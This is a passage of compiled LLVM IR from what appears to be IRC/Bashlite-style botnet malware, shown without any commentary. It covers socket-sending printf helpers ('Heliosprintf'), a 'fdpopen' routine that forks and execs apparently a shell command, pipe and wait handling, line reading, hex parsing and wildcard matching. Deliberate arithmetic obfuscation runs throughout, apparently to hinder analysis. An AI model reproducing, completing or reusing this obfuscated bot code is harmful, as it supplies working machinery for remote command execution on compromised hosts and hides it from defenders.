; <label>:53:                                     ; preds = %42
  store i32 48, i32* %10, align 4
  br label %54

; <label>:54:                                     ; preds = %53, %42
  br label %55

; <label>:55:                                     ; preds = %54, %4
  %56 = load i32, i32* %8, align 4
  %57 = xor i32 %56, -1
  %58 = xor i32 1, -1
  %59 = xor i32 -707480048, -1
  %60 = or i32 %57, %58
  %61 = or i32 -707480048, %59
  %62 = xor i32 %60, -1
  %63 = and i32 %62, %61
  %64 = and i32 %56, 1
  %65 = icmp ne i32 %63, 0
  br i1 %65, label %85, label %66

; <label>:66:                                     ; preds = %55
  br label %67

; <label>:67:                                     ; preds = %78, %66
  %68 = load i32, i32* %7, align 4
  %69 = icmp sgt i32 %68, 0
  br i1 %69, label %70, label %84

; <label>:70:                                     ; preds = %67
  %71 = load i8**, i8*** %5, align 8
  %72 = load i32, i32* %10, align 4
  call void @printchar(i8** %71, i32 %72)
  %73 = load i32, i32* %9, align 4
  %74 = add i32 %73, -365751920
  %75 = add i32 %74, 1
  %76 = sub i32 %75, -365751920
  %77 = add nsw i32 %73, 1
  store i32 %76, i32* %9, align 4
  br label %78

; <label>:78:                                     ; preds = %70
  %79 = load i32, i32* %7, align 4
  %80 = sub i32 %79, 1207665632
  %81 = add i32 %80, -1
  %82 = add i32 %81, 1207665632
  %83 = add nsw i32 %79, -1
  store i32 %82, i32* %7, align 4
  br label %67

; <label>:84:                                     ; preds = %67
  br label %85

; <label>:85:                                     ; preds = %84, %55
  br label %86

; <label>:86:                                     ; preds = %100, %85
  %87 = load i8*, i8** %6, align 8
  %88 = load i8, i8* %87, align 1
  %89 = icmp ne i8 %88, 0
  br i1 %89, label %90, label %103

; <label>:90:                                     ; preds = %86
  %91 = load i8**, i8*** %5, align 8
  %92 = load i8*, i8** %6, align 8
  %93 = load i8, i8* %92, align 1
  %94 = zext i8 %93 to i32
  call void @printchar(i8** %91, i32 %94)
  %95 = load i32, i32* %9, align 4
  %96 = add i32 %95, -725558740
  %97 = add i32 %96, 1
  %98 = sub i32 %97, -725558740
  %99 = add nsw i32 %95, 1
  store i32 %98, i32* %9, align 4
  br label %100

; <label>:100:                                    ; preds = %90
  %101 = load i8*, i8** %6, align 8
  %102 = getelementptr inbounds i8, i8* %101, i32 1
  store i8* %102, i8** %6, align 8
  br label %86

; <label>:103:                                    ; preds = %86
  br label %104

; <label>:104:                                    ; preds = %116, %103
  %105 = load i32, i32* %7, align 4
  %106 = icmp sgt i32 %105, 0
  br i1 %106, label %107, label %123

; <label>:107:                                    ; preds = %104
  %108 = load i8**, i8*** %5, align 8
  %109 = load i32, i32* %10, align 4
  call void @printchar(i8** %108, i32 %109)
  %110 = load i32, i32* %9, align 4
  %111 = sub i32 0, %110
  %112 = sub i32 0, 1
  %113 = add i32 %111, %112
  %114 = sub i32 0, %113
  %115 = add nsw i32 %110, 1
  store i32 %114, i32* %9, align 4
  br label %116

; <label>:116:                                    ; preds = %107
  %117 = load i32, i32* %7, align 4
  %118 = sub i32 0, %117
  %119 = sub i32 0, -1
  %120 = add i32 %118, %119
  %121 = sub i32 0, %120
  %122 = add nsw i32 %117, -1
  store i32 %121, i32* %7, align 4
  br label %104

; <label>:123:                                    ; preds = %104
  %124 = load i32, i32* %9, align 4
  ret i32 %124
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %131

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %47

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %47

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub i32 0, %43
  %45 = add i32 0, %44
  %46 = sub nsw i32 0, %43
  store i32 %45, i32* %21, align 4
  br label %47

; <label>:47:                                     ; preds = %42, %39, %36, %33
  %48 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %49 = getelementptr inbounds i8, i8* %48, i64 12
  %50 = getelementptr inbounds i8, i8* %49, i64 -1
  store i8* %50, i8** %17, align 8
  %51 = load i8*, i8** %17, align 8
  store i8 0, i8* %51, align 1
  br label %52

; <label>:52:                                     ; preds = %75, %47
  %53 = load i32, i32* %21, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %87

; <label>:55:                                     ; preds = %52
  %56 = load i32, i32* %21, align 4
  %57 = load i32, i32* %11, align 4
  %58 = urem i32 %56, %57
  store i32 %58, i32* %18, align 4
  %59 = load i32, i32* %18, align 4
  %60 = icmp sge i32 %59, 10
  br i1 %60, label %61, label %75

; <label>:61:                                     ; preds = %55
  %62 = load i32, i32* %15, align 4
  %63 = sub i32 0, 48
  %64 = add i32 %62, %63
  %65 = sub nsw i32 %62, 48
  %66 = sub i32 %64, 683502704
  %67 = sub i32 %66, 10
  %68 = add i32 %67, 683502704
  %69 = sub nsw i32 %64, 10
  %70 = load i32, i32* %18, align 4
  %71 = sub i32 %70, 517527092
  %72 = add i32 %71, %68
  %73 = add i32 %72, 517527092
  %74 = add nsw i32 %70, %68
  store i32 %73, i32* %18, align 4
  br label %75

; <label>:75:                                     ; preds = %61, %55
  %76 = load i32, i32* %18, align 4
  %77 = add i32 %76, 1690636026
  %78 = add i32 %77, 48
  %79 = sub i32 %78, 1690636026
  %80 = add nsw i32 %76, 48
  %81 = trunc i32 %79 to i8
  %82 = load i8*, i8** %17, align 8
  %83 = getelementptr inbounds i8, i8* %82, i32 -1
  store i8* %83, i8** %17, align 8
  store i8 %81, i8* %83, align 1
  %84 = load i32, i32* %11, align 4
  %85 = load i32, i32* %21, align 4
  %86 = udiv i32 %85, %84
  store i32 %86, i32* %21, align 4
  br label %52

; <label>:87:                                     ; preds = %52
  %88 = load i32, i32* %19, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %121

; <label>:90:                                     ; preds = %87
  %91 = load i32, i32* %13, align 4
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %117

; <label>:93:                                     ; preds = %90
  %94 = load i32, i32* %14, align 4
  %95 = xor i32 %94, -1
  %96 = xor i32 2, -1
  %97 = xor i32 970901915, -1
  %98 = or i32 %95, %96
  %99 = or i32 970901915, %97
  %100 = xor i32 %98, -1
  %101 = and i32 %100, %99
  %102 = and i32 %94, 2
  %103 = icmp ne i32 %101, 0
  br i1 %103, label %104, label %117

; <label>:104:                                    ; preds = %93
  %105 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %105, i32 45)
  %106 = load i32, i32* %20, align 4
  %107 = add i32 %106, -857433225
  %108 = add i32 %107, 1
  %109 = sub i32 %108, -857433225
  %110 = add nsw i32 %106, 1
  store i32 %109, i32* %20, align 4
  %111 = load i32, i32* %13, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, -1
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add nsw i32 %111, -1
  store i32 %115, i32* %13, align 4
  br label %120

; <label>:117:                                    ; preds = %93, %90
  %118 = load i8*, i8** %17, align 8
  %119 = getelementptr inbounds i8, i8* %118, i32 -1
  store i8* %119, i8** %17, align 8
  store i8 45, i8* %119, align 1
  br label %120

; <label>:120:                                    ; preds = %117, %104
  br label %121

; <label>:121:                                    ; preds = %120, %87
  %122 = load i32, i32* %20, align 4
  %123 = load i8**, i8*** %9, align 8
  %124 = load i8*, i8** %17, align 8
  %125 = load i32, i32* %13, align 4
  %126 = load i32, i32* %14, align 4
  %127 = call i32 @prints(i8** %123, i8* %124, i32 %125, i32 %126)
  %128 = sub i32 0, %127
  %129 = sub i32 %122, %128
  %130 = add nsw i32 %122, %127
  store i32 %129, i32* %8, align 4
  br label %131

; <label>:131:                                    ; preds = %121, %25
  %132 = load i32, i32* %8, align 4
  ret i32 %132
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @Heliosprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i32, i32* %3, align 4
  %24 = load i8*, i8** %6, align 8
  %25 = load i8*, i8** %6, align 8
  %26 = call i64 @strlen(i8* %25) #10
  %27 = call i64 @send(i32 %23, i8* %24, i64 %26, i32 16384)
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %8, align 4
  %29 = load i8*, i8** %6, align 8
  call void @free(i8* %29) #2
  %30 = load i32, i32* %8, align 4
  ret i32 %30
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %101 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %125

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  %99 = load i8*, i8** %4, align 8
  %100 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.344, i32 0, i32 0), i8* %99, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:101:                                    ; preds = %54
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 114
  br i1 %105, label %106, label %112

; <label>:106:                                    ; preds = %101
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %108 = load i32, i32* %107, align 4
  store i32 %108, i32* %6, align 4
  %109 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %110 = load i32, i32* %109, align 4
  %111 = call i32 @close(i32 %110)
  br label %118

; <label>:112:                                    ; preds = %101
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %114 = load i32, i32* %113, align 4
  store i32 %114, i32* %6, align 4
  %115 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @close(i32 %116)
  br label %118

; <label>:118:                                    ; preds = %112, %106
  %119 = load i32, i32* %9, align 4
  %120 = load i32*, i32** @fdopen_pids, align 8
  %121 = load i32, i32* %6, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i32, i32* %120, i64 %122
  store i32 %119, i32* %123, align 4
  %124 = load i32, i32* %6, align 4
  store i32 %124, i32* %3, align 4
  br label %125

; <label>:125:                                    ; preds = %118, %56, %47, %37, %30, %25
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %69

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %46 = load i32*, i32** @fdopen_pids, align 8
  %47 = load i32, i32* %4, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds i32, i32* %46, i64 %48
  store i32 0, i32* %49, align 4
  %50 = load i32, i32* %8, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %44
  br label %67

; <label>:53:                                     ; preds = %44
  %54 = bitcast %struct.in_addr* %9 to i32*
  %55 = load i32, i32* %7, align 4
  store i32 %55, i32* %54, align 4
  %56 = bitcast %struct.in_addr* %9 to i32*
  %57 = load i32, i32* %56, align 4
  %58 = xor i32 %57, -1
  %59 = xor i32 65280, -1
  %60 = xor i32 1961786212, -1
  %61 = or i32 %58, %59
  %62 = or i32 1961786212, %60
  %63 = xor i32 %61, -1
  %64 = and i32 %63, %62
  %65 = and i32 %57, 65280
  %66 = ashr i32 %64, 8
  br label %67

; <label>:67:                                     ; preds = %53, %52
  %68 = phi i32 [ -1, %52 ], [ %66, %53 ]
  store i32 %68, i32* %2, align 4
  br label %69

; <label>:69:                                     ; preds = %67, %19
  %70 = load i32, i32* %2, align 4
  ret i32 %70
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %27, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %41

; <label>:27:                                     ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %8, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %8, align 4
  %36 = sub i32 0, %35
  %37 = sub i32 0, 1
  %38 = add i32 %36, %37
  %39 = sub i32 0, %38
  %40 = add nsw i32 %35, 1
  store i32 %39, i32* %8, align 4
  br label %9

; <label>:41:                                     ; preds = %25
  %42 = load i32, i32* %7, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %41
  br label %47

; <label>:45:                                     ; preds = %41
  %46 = load i8*, i8** %4, align 8
  br label %47

; <label>:47:                                     ; preds = %45, %44
  %48 = phi i8* [ null, %44 ], [ %46, %45 ]
  ret i8* %48
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  br label %4

; <label>:4:                                      ; preds = %14, %1
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  br i1 %8, label %9, label %12

; <label>:9:                                      ; preds = %4
  %10 = load i64, i64* %3, align 8
  %11 = icmp sge i64 %10, 0
  br label %12

; <label>:12:                                     ; preds = %9, %4
  %13 = phi i1 [ false, %4 ], [ %11, %9 ]
  br i1 %13, label %14, label %39

; <label>:14:                                     ; preds = %12
  %15 = load i64, i64* %3, align 8
  %16 = shl i64 %15, 4
  %17 = load i8*, i8** %2, align 8
  %18 = getelementptr inbounds i8, i8* %17, i32 1
  store i8* %18, i8** %2, align 8
  %19 = load i8, i8* %17, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %20
  %22 = load i64, i64* %21, align 8
  %23 = xor i64 %16, -1
  %24 = xor i64 %22, -1
  %25 = xor i64 7692691666833019748, -1
  %26 = and i64 %23, 7692691666833019748
  %27 = and i64 %16, %25
  %28 = and i64 %24, 7692691666833019748
  %29 = and i64 %22, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 7692691666833019748, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %16, %22
  store i64 %37, i64* %3, align 8
  br label %4

; <label>:39:                                     ; preds = %12
  %40 = load i64, i64* %3, align 8
  ret i64 %40
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  switch i32 %8, label %89 [
    i32 0, label %9
    i32 42, label %13
    i32 63, label %52
  ]

; <label>:9:                                      ; preds = %2
  %10 = load i8*, i8** %5, align 8
